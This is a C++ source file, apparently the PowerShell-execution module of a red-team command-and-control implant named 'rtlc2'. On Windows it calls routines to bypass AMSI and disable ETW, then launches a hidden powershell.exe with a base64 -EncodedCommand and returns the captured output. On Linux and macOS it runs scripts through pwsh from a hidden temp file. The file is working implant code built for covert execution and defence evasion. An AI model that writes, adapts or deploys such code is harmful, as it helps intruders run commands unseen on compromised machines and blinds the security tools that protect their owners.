// PowerShell Execution Module
// Windows: Spawn hidden powershell.exe with -EncodedCommand and capture output
// POSIX: Execute via pwsh (PowerShell Core) subprocess

#include "execution.h"
#include <string>
#include <vector>
#include <cstdio>
#include <cstring>

#ifdef RTLC2_WINDOWS

#include <windows.h>
#include "evasion.h"

namespace rtlc2 {
namespace execution {

// Capture stdout/stderr via pipe redirection
class PSOutputCapture {
public:
    PSOutputCapture() {
        SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
        CreatePipe(&hRead_, &hWrite_, &sa, 0);
        SetHandleInformation(hRead_, HANDLE_FLAG_INHERIT, 0);
        origStdout_ = GetStdHandle(STD_OUTPUT_HANDLE);
        origStderr_ = GetStdHandle(STD_ERROR_HANDLE);
        SetStdHandle(STD_OUTPUT_HANDLE, hWrite_);
        SetStdHandle(STD_ERROR_HANDLE, hWrite_);
    }

    ~PSOutputCapture() {
        SetStdHandle(STD_OUTPUT_HANDLE, origStdout_);
        SetStdHandle(STD_ERROR_HANDLE, origStderr_);
        if (hRead_) CloseHandle(hRead_);
        if (hWrite_) CloseHandle(hWrite_);
    }

    std::string GetOutput() {
        CloseHandle(hWrite_);
        hWrite_ = NULL;
        std::string output;
        char buf[4096];
        DWORD bytesRead;
        while (ReadFile(hRead_, buf, sizeof(buf) - 1, &bytesRead, NULL) && bytesRead > 0) {
            buf[bytesRead] = '\0';
            output += buf;
        }
        return output;
    }

private:
    HANDLE hRead_ = NULL;
    HANDLE hWrite_ = NULL;
    HANDLE origStdout_ = NULL;
    HANDLE origStderr_ = NULL;
};

std::string ExecutePowerShell(const std::string& script) {
    if (script.empty()) {
        return "Error: empty PowerShell script";
    }

    // Bypass AMSI and ETW before spawning PowerShell subprocess
    // This patches the current process, affecting child process inheritance
    evasion::BypassAMSI();
    evasion::DisableETW();

    // Create a hidden PowerShell process with redirected I/O
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hReadOut, hWriteOut;
    CreatePipe(&hReadOut, &hWriteOut, &sa, 0);
    SetHandleInformation(hReadOut, HANDLE_FLAG_INHERIT, 0);

    HANDLE hReadIn, hWriteIn;
    CreatePipe(&hReadIn, &hWriteIn, &sa, 0);
    SetHandleInformation(hWriteIn, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = { sizeof(si) };
    si.hStdInput = hReadIn;
    si.hStdOutput = hWriteOut;
    si.hStdError = hWriteOut;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {};

    // Try pwsh first (PowerShell 7+), then fall back to powershell.exe
    char cmdLine[32768];
    snprintf(cmdLine, sizeof(cmdLine),
        "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand ");

    // Base64-encode the script as UTF-16LE for -EncodedCommand
    std::vector<uint8_t> utf16Script;
    for (char c : script) {
        utf16Script.push_back((uint8_t)c);
        utf16Script.push_back(0);
    }

    // Base64 encode
    static const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string b64;
    size_t i = 0;
    size_t len = utf16Script.size();
    while (i < len) {
        uint32_t octet_a = i < len ? utf16Script[i++] : 0;
        uint32_t octet_b = i < len ? utf16Script[i++] : 0;
        uint32_t octet_c = i < len ? utf16Script[i++] : 0;
        uint32_t triple = (octet_a << 16) + (octet_b << 8) + octet_c;
        b64 += b64chars[(triple >> 18) & 0x3F];
        b64 += b64chars[(triple >> 12) & 0x3F];
        b64 += (i > len + 1) ? '=' : b64chars[(triple >> 6) & 0x3F];
        b64 += (i > len) ? '=' : b64chars[triple & 0x3F];
    }

    // Append the base64 encoded command
    size_t cmdLen = strlen(cmdLine);
    if (cmdLen + b64.size() < sizeof(cmdLine) - 1) {
        memcpy(cmdLine + cmdLen, b64.c_str(), b64.size());
        cmdLine[cmdLen + b64.size()] = '\0';
    }

    BOOL created = CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    CloseHandle(hReadIn);
    CloseHandle(hWriteOut);

    if (!created) {
        CloseHandle(hReadOut);
        CloseHandle(hWriteIn);
        return "Error: failed to start powershell.exe (error " + std::to_string(GetLastError()) + ")";
    }

    CloseHandle(hWriteIn);

    // Read output with 30-second timeout
    std::string output;
    DWORD waitResult = WaitForSingleObject(pi.hProcess, 30000);

    if (waitResult == WAIT_TIMEOUT) {
        TerminateProcess(pi.hProcess, 1);
        output = "[Timeout: PowerShell execution exceeded 30 seconds]\n";
    }

    // Read remaining output
    char buf[4096];
    DWORD bytesRead;
    while (ReadFile(hReadOut, buf, sizeof(buf) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buf[bytesRead] = '\0';
        output += buf;
    }

    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);

    CloseHandle(hReadOut);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (output.empty()) {
        output = "PowerShell executed (exit code: " + std::to_string(exitCode) + ")";
    }

    return output;
}

} // namespace execution
} // namespace rtlc2

#else // POSIX

#include <cstdlib>
#include <unistd.h>

namespace rtlc2 {
namespace execution {

std::string ExecutePowerShell(const std::string& script) {
    if (script.empty()) {
        return "Error: empty PowerShell script";
    }

    // Try pwsh (PowerShell Core) on Linux/macOS
    // Write script to temp file, execute with popen
    char tmpPath[] = "/tmp/.rtlc2_ps_XXXXXX";
    int fd = mkstemp(tmpPath);
    if (fd < 0) {
        return "Error: failed to create temp file for PowerShell script";
    }

    ssize_t written = write(fd, script.c_str(), script.size());
    close(fd);

    if (written < 0 || (size_t)written != script.size()) {
        remove(tmpPath);
        return "Error: failed to write PowerShell script to temp file";
    }

    // Build command: pwsh -NoProfile -NonInteractive -File <tmpfile>
    std::string cmd = "pwsh -NoProfile -NonInteractive -File ";
    cmd += tmpPath;
    cmd += " 2>&1";

    FILE* pipe = popen(cmd.c_str(), "r");
    if (!pipe) {
        remove(tmpPath);
        return "Error: pwsh not found or failed to execute. Install PowerShell Core (pwsh).";
    }

    std::string output;
    char buf[4096];
    while (fgets(buf, sizeof(buf), pipe) != nullptr) {
        output += buf;
    }

    int status = pclose(pipe);
    remove(tmpPath);

    if (output.empty()) {
        if (status != 0) {
            return "Error: pwsh exited with status " + std::to_string(status) +
                   ". Is PowerShell Core installed?";
        }
        return "PowerShell executed (no output)";
    }

    return output;
}

} // namespace execution
} // namespace rtlc2

#endif // RTLC2_WINDOWS
